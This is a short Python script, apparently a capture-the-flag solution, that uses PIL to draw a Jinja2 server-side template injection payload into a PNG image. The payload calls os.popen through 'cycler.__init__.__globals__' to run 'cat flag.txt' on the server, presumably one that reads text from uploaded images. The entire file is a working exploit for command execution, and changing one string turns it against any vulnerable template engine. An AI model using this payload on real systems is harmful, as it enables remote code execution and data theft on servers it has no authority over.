from PIL import Image, ImageDraw, ImageFont

cmd = "cat flag.txt"
payload = "{{ cycler.__init__.__globals__.os.popen('"+cmd+"').read() }}"

img = Image.new('RGB', (len(payload)*20, 90), color = (255,255,255))

fnt = ImageFont.truetype('consola.ttf', 32)
d = ImageDraw.Draw(img)

d.text((30,30), payload, font=fnt, fill=(0,0,0))

img.save('1.png')